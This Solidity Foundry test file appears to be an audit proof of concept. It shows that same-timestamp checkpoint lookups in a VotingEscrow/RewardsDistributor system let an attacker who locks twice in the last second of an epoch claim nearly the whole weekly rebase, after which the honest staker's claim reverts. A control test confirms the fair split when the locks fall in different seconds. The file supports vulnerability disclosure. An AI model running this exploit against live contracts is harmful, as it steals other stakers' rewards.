// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./VeBase.t.sol";

/// Escalation of the same-timestamp checkpoint lookup bug:
/// VotingEscrow._checkpoint appends a new global point for every operation, even within the same timestamp,
/// and totalSupplyAtT()/balanceOfNFTAt() binary-search by timestamp returning the FIRST match found.
/// RewardsDistributor pays each veNFT `balanceOfNFTAt(id, weekEnd-1) * tokens_per_week / totalSupplyAtT(weekEnd-1)`.
/// An attacker who performs two lock operations in the last second of an epoch makes the supply lookup return a
/// point that EXCLUDES their new lock, while their own balance lookup includes it -> they are paid as if the rest of
/// the supply were theirs. Sum of claims exceeds the week's rebase; honest claimers' claims revert.
contract RebaseStealTest is VeBase {
    function test_lastSecondLocksStealWeeklyRebase() public {
        // honest staker
        uint256 honest = _lock(alice, 1000e18, MAXTIME);
        emit log_named_uint("start ts", block.timestamp);

        // week W; distributor checkpointed at its start so the whole rebase lands in week W
        uint256 W = HybraTimeLibrary.epochNext(block.timestamp);
        vm.warp(W);
        vm.prank(address(minter));
        rewardsDistributor.checkpoint_token();

        // attacker: a dummy lock op then the real lock, both in the last second of week W (one tx / contract)
        uint256 t = W + WEEK - 1;
        vm.warp(t);
        _lock(bob, 1e18, MAXTIME);                  // dummy op -> global point that excludes the next lock
        uint256 atk = _lock(bob, 1000e18, MAXTIME); // same size as honest staker: fair share ~50%

        uint256 sup = votingEscrow.totalSupplyAtT(t);
        uint256 ba = votingEscrow.balanceOfNFTAt(atk, t);
        uint256 bh = votingEscrow.balanceOfNFTAt(honest, t);
        emit log_named_decimal_uint("supply@weekEnd (stale)", sup, 18);
        emit log_named_decimal_uint("attacker@weekEnd      ", ba, 18);
        emit log_named_decimal_uint("honest@weekEnd        ", bh, 18);
        assertGt(ba + bh, sup * 19 / 10, "balances sum to ~2x the reported supply");

        // weekly rebase: 1000 HYBR deposited and checkpointed exactly at the start of week W+1
        vm.warp(W + WEEK);
        hybr.transfer(address(rewardsDistributor), 1000e18);
        vm.prank(address(minter));
        rewardsDistributor.checkpoint_token();
        emit log_named_decimal_uint("tokens_per_week[W]    ", rewardsDistributor.tokens_per_week(W), 18);
        emit log_named_uint("W", W);
        emit log_named_uint("last_token_time", rewardsDistributor.last_token_time());
        emit log_named_uint("start_time", rewardsDistributor.start_time());
        for (uint256 x = 0; x <= W + WEEK; x += WEEK) {
            emit log_named_uint("  week", x);
            emit log_named_decimal_uint("    tokens", rewardsDistributor.tokens_per_week(x), 18);
        }

        // attacker claims ~100% instead of ~50%
        uint256 got = rewardsDistributor.claim(atk);
        emit log_named_decimal_uint("attacker rebase claimed", got, 18);
        assertGt(got, 900e18);

        // honest staker's claim now reverts (distributor drained) -> their rebase is stolen
        vm.expectRevert();
        rewardsDistributor.claim(honest);
    }

    /// Control: same operations spread over two different seconds -> supply correct, fair ~50/50 split.
    function test_control_differentSecondsFairSplit() public {
        uint256 honest = _lock(alice, 1000e18, MAXTIME);
        uint256 W = HybraTimeLibrary.epochNext(block.timestamp);
        vm.warp(W);
        vm.prank(address(minter));
        rewardsDistributor.checkpoint_token();

        vm.warp(W + WEEK - 2);
        _lock(bob, 1e18, MAXTIME);
        vm.warp(W + WEEK - 1);
        uint256 atk = _lock(bob, 1000e18, MAXTIME);

        vm.warp(W + WEEK);
        hybr.transfer(address(rewardsDistributor), 1000e18);
        vm.prank(address(minter));
        rewardsDistributor.checkpoint_token();

        uint256 got = rewardsDistributor.claim(atk);
        uint256 gotH = rewardsDistributor.claim(honest);
        assertApproxEqRel(got, 500e18, 0.01e18);
        assertApproxEqRel(gotH, 500e18, 0.01e18);
    }
}
